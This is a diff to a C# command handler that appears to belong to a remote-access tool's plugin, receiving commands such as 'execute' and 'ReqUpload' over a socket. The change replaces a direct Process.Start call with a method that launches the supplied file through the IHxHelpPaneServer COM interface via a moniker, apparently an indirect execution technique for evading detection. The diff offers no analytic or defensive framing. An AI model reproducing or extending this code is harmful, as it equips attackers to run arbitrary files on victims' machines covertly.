@@ -6,6 +6,8 @@ using System.Text;
 using System.Diagnostics;
 using System.Threading;
 using MessagePackLib.MessagePack;
+using System.Runtime.InteropServices;
+using Microsoft.Win32;
 
 namespace Plugin.Handler
 {
@@ -63,7 +65,7 @@ namespace Plugin.Handler
                     case "execute":
                         {
                             string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
-                            Process.Start(fullPath);
+                            Execute(fullPath);
                             break;
                         }
 
@@ -370,6 +372,22 @@ namespace Plugin.Handler
                 tempSocket?.Dispose();
                 return;
             }
+        }
+
+        [ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        interface IHxHelpPaneServer
+        {
+            void DisplayTask(string task);
+            void DisplayContents(string contents);
+            void DisplaySearchResults(string search);
+            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
+        }
+
+        public void Execute(string fullpath)
+        {
+            IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee"));
+            Uri target = new Uri(fullpath);
+            server.Execute(target.AbsoluteUri);
         }
 
         public void ReqUpload(string id)
